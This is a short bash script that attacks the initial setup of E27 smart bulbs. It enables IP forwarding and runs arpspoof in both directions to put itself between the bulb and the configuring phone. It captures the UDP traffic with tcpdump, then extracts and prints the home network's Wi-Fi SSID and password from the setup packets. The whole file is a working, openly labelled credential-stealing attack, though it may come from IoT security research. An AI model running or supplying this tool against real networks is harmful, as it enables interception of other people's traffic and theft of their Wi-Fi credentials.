#!/bin/bash

#========================================================================================
#
#	Author: Austin Turecek aka Galapag0s
#
#	Date: TBD
#
#	Purpose: Grab wifi ssid and password in initial setup of E27 Smart Bulbs
#
#	Arguments:
#		$1: Bulb IP (Generally 10.10.123.3)
#		$2: Phone IP Being used to Add Bulb To Wifi (Generally 10.10.123.4 or 5)
#		$3: Network Interface Where You Will Connect to Bulbs Wifi Signal
#==========================================================================================

echo "If Either MAC is 0:0:0:0:0:0 Your Attack Will Fail!"
echo "If It Will Fail, START OVER QUICKLY!!"
#Enable IP Forwarding
sysctl -w net.ipv4.ip_forward=1
#Begin MITM Attack Between Bulb and Phone
arpspoof -i $3 -t $1 $2 &
arpspoof -i $3 -t $2 $1 &
#Record Traffic and Write To File Named connectPack
tcpdump -i $3 -nn udp -w connectPack

echo ""
echo ""

#Pull out the SSID the Bulb will Connect To
SSID=`strings connectPack | grep ".WSSSID." | head -1`

echo "SSID (Is After the =)"
#Print out the SSID Found IN Packet
echo "$SSID"

echo ""

#Pull out the Wifi Password
Password=`strings connectPack | grep ".WSKEY." | head -1`

echo "Wifi Security, Encryption Type, Password"
echo "$Password"

echo ""

#Stop All Instances of arpspoof
pkill arpspoof

#Remove the ConnectPack File
rm connectPack
